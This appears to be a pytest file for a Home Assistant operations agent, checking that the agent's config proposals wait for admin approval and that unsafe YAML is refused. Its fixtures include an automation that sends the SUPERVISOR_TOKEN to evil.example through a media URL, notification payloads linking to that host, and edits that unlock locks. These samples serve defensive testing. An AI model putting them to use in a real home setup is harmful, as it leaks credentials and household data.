    h.claude_reply = {"reply": "Proposed; approve it in Ops.", "summary": ""}
    await ask(d, "rename the fridge alert")
    proposed, refused, internal, fact = h.in_run_responses
    assert proposed["ok"] and "Only the admin can apply it" in proposed["output"], proposed
    assert not refused["ok"] and "cannot be changed by the agent" in refused["error"]
    assert not internal["ok"] and "unknown verb" in internal["error"]
    assert fact["ok"], fact
    assert not h.paths.drafts_dir.exists()  # wiped after the run
    assert d.store is not None and d.changes is not None
    states = {c["subject"]: c["state"] for c in d.store.changes()}
    assert states["fix(alerts): name the fridge alert"] == "open" and states["fix: x"] == "refused"
    assert (h.paths.ha_config / ALERT).read_text() == FILES[ALERT]  # nothing applied


async def test_triage_and_follow_ups_cannot_propose() -> None:
    from opsd.runner import FOLLOWUP, TRIAGE

    for profile in (TRIAGE, FOLLOWUP):
        assert {"change.propose", "facts.propose"}.isdisjoint(profile.capabilities) and not profile.drafts
    from opsd.capabilities import CAPABILITIES
    from opsd.policy import Origin

    assert Origin.AGENT_SELF not in CAPABILITIES["change.propose"].origins


async def test_remember_this_becomes_a_git_proposal(p: Any, h: Any) -> None:  # noqa: F811
    from tests.test_panel import new_thread, send

    repo_from(h.paths)
    h.claude_reply = {"reply": "Noted.", "summary": ""}
    thread = await new_thread(p)
    await send(p, thread, "the garden speaker is unplugged in winter")
    assert p.d.assistant is not None and p.d.store is not None
    await p.d.assistant.drain()
    turn = next(t for t in p.d.store.turns_page(thread, limit=10) if t.role == "admin")
    fact = {"turn_id": turn.id, "text": "The garden speaker is unplugged in winter."}
    status, _, body = await p.request("POST", f"/api/threads/{thread}/remember", body=fact)
    assert status == 201 and body["change"] and body["refused"] is None
    row = p.d.store.change(int(body["change"]))
    assert row is not None and row["kind"] == "facts" and [f["path"] for f in row["files"]] == [FACTS_PATH]
    assert row["state"] == "open" and "+- The garden speaker is unplugged in winter." in row["diff"]
    assert (h.paths.ha_config / FACTS_PATH).read_text() == FILES[FACTS_PATH]  # nothing until the admin approves


async def test_the_proposals_script_is_served_to_the_admin_only(p: Any) -> None:  # noqa: F811
    status, headers, body = await p.request("GET", "/changes.js")
    assert status == 200 and headers["content-type"].startswith("text/javascript") and "opsViews" in body
    assert headers["x-content-type-options"] == "nosniff"
    status, _, _ = await p.request("GET", "/changes.js", admin=False)
    assert status == 403
    status, _, _ = await p.request("GET", "/other.js")
    assert status == 404


async def act_on_change(p: Any, change_id: int, action: str) -> tuple[int, dict[str, Any]]:  # noqa: F811
    """The admin's action on a proposal's item (Home), for the revision the panel shows."""
    from opsd.items import change_key

    await p.d.items_flush()
    item = p.d.store.item_by_key(change_key(change_id))
    status, _, body = await p.request("POST", f"/api/items/{item['id']}/act",
                                      body={"action": action, "revision": item["revision"]})  # fmt: skip
    return status, body


# ------------------------------------------------ tags, directives, keys


EXFIL = (
    "%TAG !x! !env_\n---\nalias: Exfil\ntrigger:\n  - platform: state\n    entity_id: sensor.fridge\naction:\n"
    "  - action: media_player.play_media\n    target:\n      entity_id: media_player.kitchen\n    data:\n"
    '      media_content_id: "https://evil.example/{{ token }}"\n      media_content_type: music\n'
    "    variables:\n      token: !x!var SUPERVISOR_TOKEN\n"
)


@pytest.mark.parametrize(
    ("text", "reason"),
    [
        (EXFIL, "directives|`!`|tags"),
        ("alias: a\naction:\n  - action: light.turn_on\n    data:\n      x: !!str 5\n", "`!`|tags"),
        ('alias: a\naction:\n  - action: light.turn_on\n    data: {x: !!binary "aGk="}\n', "`!`|tags"),
        ("%YAML 1.1\n---\nalias: a\n", "directives"),
        ("---\nalias: a\n", "document markers"),
        ("alias: a\n---\nalias: b\n", "one YAML document|document markers"),
        ("alias: a\nalias: b\n", "duplicate key"),
        ("alias: a\naction:\n  - action: light.turn_on\n    action: lock.unlock\n", "duplicate key|locks"),
        ("? [a, b]\n: 1\n", "plain scalars"),
    ],
)
def test_tags_directives_documents_and_duplicate_keys_are_refused(text: str, reason: str) -> None:
    with pytest.raises(ChangeRefused, match=reason):
        check(FRIDGE, text)


def test_the_exact_tag_exploit_is_refused_by_the_parser_too() -> None:
    from opsd import configcheck

    # Even if the line pre-filter were bypassed, the event stream refuses the directive and the tag.
    with pytest.raises(configcheck.ConfigRefused, match="directives"):
        configcheck.parse(EXFIL)
    with pytest.raises(configcheck.ConfigRefused, match="explicit YAML tags"):
        configcheck.parse("a: !x var\n")
    assert configcheck.line_problem('a: "x != y"\nb: >\n  {{ x != y }}\n# a ! comment\n') is None
    assert configcheck.line_problem("a: x != y\n") is not None


@pytest.mark.parametrize(
    ("actions", "reason"),
    [
        (
            "  - action: media_player.play_media\n    target:\n      entity_id: media_player.kitchen\n",
            "play_media is not allowed",
        ),
        (
            "  - action: media_player.select_source\n    target:\n      entity_id: media_player.kitchen\n",
            "select_source is not allowed",
        ),
        ("  - action: media_player.join\n    target:\n      entity_id: media_player.kitchen\n", "join is not"),
        (
            "  - action: media_player.volume_set\n    target:\n      entity_id: media_player.kitchen\n    data:\n"
            '      volume_level: "{{ 0.5 }}"\n',
            "cannot use templates",
        ),
        (
            "  - action: notify.mobile_app_admin_phone\n    data:\n      message: hi\n      data:\n"
            "        actions:\n          - action: UNLOCK\n            title: Unlock\n",
            "URI links|links into the app|literal names",
        ),
    ],
)
def test_media_players_and_notification_buttons_are_limited(actions: str, reason: str) -> None:
    with pytest.raises(ChangeRefused, match=reason):
        check(FRIDGE, automation(actions), FILES[FRIDGE])


def test_media_volume_is_allowed() -> None:
    check(FRIDGE, automation("  - action: media_player.volume_set\n    target:\n      entity_id: media_player.kitchen\n"
                             "    data:\n      volume_level: 0.3\n"), FILES[FRIDGE])  # fmt: skip


async def test_helpers_watched_by_bigger_automations_cannot_be_targeted(w: World) -> None:
    watcher = ("alias: Heater\ntrigger:\n  - platform: state\n    entity_id: input_boolean.guest_mode\naction:\n"
               "  - action: switch.turn_on\n    target:\n      entity_id: switch.heater\n")  # fmt: skip
    (w.repo_path / "automations" / "heater.yaml").write_text(watcher)
    git(w.repo_path, "add", "-A")
    git(w.repo_path, "commit", "-q", "-m", "chore: heater")
    flip = automation("  - action: input_boolean.turn_on\n    target:\n      entity_id: input_boolean.guest_mode\n")
    with pytest.raises(ChangeRefused, match="reacts to it"):
        w.propose({"automations/flip.yaml": flip})
    # A light is fine; and an unreadable automation makes every helper target unverifiable.
    w.propose({"automations/light.yaml": automation("  - action: light.turn_on\n    entity_id: light.kitchen\n")})
    (w.repo_path / "automations" / "heater.yaml").write_text("alias: [broken\n")
    git(w.repo_path, "commit", "-q", "-am", "chore: break")
    other = automation("  - action: counter.increment\n    target:\n      entity_id: counter.visits\n")
    with pytest.raises(ChangeRefused, match="could not be read"):
        build_proposal(w.store, w.repo, w.options, kind="change",
                       files=[FileChange("automations/c.yaml", other.encode())], subject="feat(automations): count",
                       why="w", effect="e", requested_by="x", day="2026-01-28", now=w.now,
                       entities=REGISTRY | {"counter.visits"})  # fmt: skip


# ---------------------------------------------------------- push data

PUSH_BAD = [
    ('image: "https://evil.example/x.png"', "push data may hold"),
    ("video: /media/x.mp4", "push data may hold"),
    ("attachment:\n  url: https://evil.example/{{ states('sensor.fridge') }}", "push data may hold"),
    ("url: https://evil.example", "push data may hold"),
    ("clickAction: https://evil.example", "push data may hold"),
    ("entity_id: camera.door", "push data may hold"),
    ("tag: \"{{ states('sensor.fridge') }}\"", "literal"),
    ("push:\n  sound: alarm.caf", "interruption-level only"),
    ("push:\n  interruption-level: \"{{ 'critical' }}\"", "interruption-level only"),
    ("actions:\n  - action: UNLOCK\n    title: Unlock", "URI links|links into the app|literal names"),
    ("actions:\n  - action: URI\n    title: View\n    uri: https://evil.example/x", "paths inside"),
    ("actions:\n  - action: URI\n    title: View\n    uri: //evil.example/x", "paths inside"),
    ('actions:\n  - action: URI\n    title: View\n    uri: "/\\\\evil.example"', "paths inside"),
    ("actions:\n  - action: URI\n    title: View\n    uri: \"/x?{{ states('sensor.fridge') }}\"", "literal URI"),
    (
        "actions:\n  - action: URI\n    title: View\n    uri: /x\n    destructive: true",
        "URI links|links into the app|literal names",
    ),
]
GOOD_PUSH = (
    "tag: fridge\npush:\n  interruption-level: time-sensitive\nactions:\n  - action: URI\n    title: View\n"
    '    uri: "/history?entity_id=sensor.fridge"'
)


def indent(text: str, spaces: int) -> str:
    return "".join(" " * spaces + line + "\n" for line in text.splitlines())


def notify_call(push: str) -> str:
    return f"  - action: notify.mobile_app_admin_phone\n    data:\n      message: hi\n      data:\n{indent(push, 8)}"


@pytest.mark.parametrize(("push", "reason"), PUSH_BAD)
def test_push_data_is_an_allowlist_in_notify_calls(push: str, reason: str) -> None:
    with pytest.raises(ChangeRefused, match=reason):
        check(FRIDGE, automation(notify_call(push)), FILES[FRIDGE])


@pytest.mark.parametrize(("push", "reason"), PUSH_BAD)
def test_push_data_is_an_allowlist_in_alerts(push: str, reason: str) -> None:
    with pytest.raises(ChangeRefused, match=reason):
        check(ALERT, FILES[ALERT] + f"    data:\n{indent(push, 6)}", FILES[ALERT])


def test_in_app_links_and_plain_push_data_are_allowed() -> None:
    check(FRIDGE, automation(notify_call(GOOD_PUSH)), FILES[FRIDGE])
    check(ALERT, FILES[ALERT] + f"    data:\n{indent(GOOD_PUSH, 6)}", FILES[ALERT])
    with pytest.raises(ChangeRefused, match="notify data may hold"):
        check(FRIDGE, automation("  - action: notify.critical_alerts\n    data:\n      message: hi\n"
                                 "      target: someone\n"), FILES[FRIDGE])  # fmt: skip


def test_a_link_shaped_step_is_still_refused() -> None:
    with pytest.raises(ChangeRefused, match="literal names"):
        check(FRIDGE, automation("  - action: URI\n    title: x\n    uri: /x\n"), FILES[FRIDGE])


def test_trigger_event_data_is_match_data_not_a_call() -> None:
    text = ("alias: Remote\ntrigger:\n  - platform: event\n    event_type: acme_solar_event\n    event_data:\n"
            "      action: released\naction:\n  - action: fan.turn_off\n    entity_id: fan.bedroom\n")  # fmt: skip
    check(FRIDGE, text, FILES[FRIDGE])


# ------------------------------------------------- approving in the panel


async def test_a_refused_execution_says_why_on_the_card(w: World) -> None:
    found = w.propose({ALERT: NEW_ALERT})
    approval = await w.approve(found["id"])
    assert await w.manager.confirm(approval, ADMIN) == "approved"
    (w.repo_path / "configuration.yaml").write_text("homeassistant:\n  name: Busy\n")  # dirty tree
    outcome = await w.manager.execute(approval)
    row = w.store.change(found["id"])
    assert outcome.state == "refused" and row is not None and row["state"] == "open"
    assert row["detail"].startswith("Not applied: the config has uncommitted changes")


async def test_approve_in_the_panel_applies_with_no_push(p: Any, h: Any) -> None:  # noqa: F811
    """Approve in the panel is enough, and nothing is pushed."""
    from opsd.events import Event, Priority

    repo_from(h.paths)
    assert p.d.store is not None and p.d.changes is not None
    found = ch.propose_fact(p.d.store, p.d.repo, p.d.options, fact="The garden speaker is off in winter.", why="noted",
                            requested_by="panel:u-admin", day="2026-01-28", now=datetime.now(UTC))  # fmt: skip
    await p.d.items_flush()  # its Needs you push
    before = len(h.pushes())
    status, body = await act_on_change(p, found["id"], "apply")
    assert status == 200 and "confirm" not in body
    assert len(h.pushes()) == before
    [approval] = [a for a in p.d.store.approvals(limit=5) if a["subject"] == f"change:{found['id']}:apply"]
    assert approval["state"] == "approved"
    await p.d._on_change_approved(Event("changes.execute", "panel", Priority.APPROVAL, {"approval": approval["id"]}))
    row = p.d.store.change(found["id"])
    assert row is not None and row["state"] == "applied" and ", not pushed" in row["detail"]
    audit = [r for r in p.d.store.audit_rows(limit=20) if r["capability"] == "panel.approve_change"]
    assert audit and audit[0]["outcome"] == "done"


# ------------------------------------------- an update's config change


async def test_an_updates_config_change_is_a_one_tap_proposal_linked_to_it(w: World) -> None:
    """The review's exact-text edits become an ordinary proposal for exactly that update; one approval applies it,
    and the link then reads `applied` (the update rule lets the update go ahead on its next plan)."""
    from opsd import updatefix

    item = {"entity_id": "update.home_assistant_core_update", "title": "Home Assistant Core", "latest": "2026.11.1"}
    edits = updatefix.parse_edits([{"path": TEMPLATE, "old": "{{ 1 }}", "new": "{{ 2 }}"}, {"path": 7}, "x"])
    assert edits == [updatefix.Edit(TEMPLATE, "{{ 1 }}", "{{ 2 }}")]
    assert updatefix.fix_record(w.store, item["entity_id"], item["latest"]) is None
    row = updatefix.propose(w.store, w.repo, w.options, item=item, why="Template: legacy syntax removed (notes).",
                            edits=edits, domains=frozenset({"template"}), day="2026-01-28", now=w.now,
                            entities=REGISTRY)  # fmt: skip
    assert row["state"] == "open" and row["requested_by"] == "update-fix:update.home_assistant_core_update@2026.11.1"
    assert row["subject"] == "fix(updates): adapt config to home assistant core 2026.11.1"
    assert updatefix.fix_record(w.store, item["entity_id"], item["latest"]) == {"change": row["id"], "state": "open"}
    assert w.read(TEMPLATE) == FILES[TEMPLATE]  # nothing applied before the admin approves
    outcome = await w.run(int(row["id"]))
    assert outcome.state == "applied" and "{{ 2 }}" in w.read(TEMPLATE) and ("template", "reload") in w.reloads
    assert updatefix.fix_record(w.store, item["entity_id"], item["latest"]) == {"change": row["id"], "state": "applied"}


@pytest.mark.parametrize(
    ("edits", "refusal"),
    [
        ([{"path": TEMPLATE, "old": "    ", "new": "  "}], "exactly once"),
        ([{"path": "secrets.yaml", "old": "a", "new": "b"}], "not a file"),
        ([{"path": "automations/missing.yaml", "old": "a", "new": "b"}], "does not exist"),
        ([{"path": "automations/locks/auto_lock.yaml", "old": "lock.lock", "new": "lock.unlock"}], "locks"),
        (
            [{"path": "configuration.yaml", "old": "name: Home", "new": "name: Away"}],
            "may not change the homeassistant",
        ),
    ],
)
def test_an_updates_config_change_passes_every_proposal_rule(w: World, edits: list[Any], refusal: str) -> None:
    from opsd import updatefix

    item = {"entity_id": "update.home_assistant_core_update", "title": "Core", "latest": "2026.11.1"}
    with pytest.raises(ch.ChangeRefused, match=refusal):
        updatefix.propose(w.store, w.repo, w.options, item=item, why="w", edits=updatefix.parse_edits(edits),
                          domains=frozenset({"template"}), day="2026-01-28", now=w.now, entities=REGISTRY)  # fmt: skip
    assert updatefix.fix_record(w.store, item["entity_id"], item["latest"]) is None
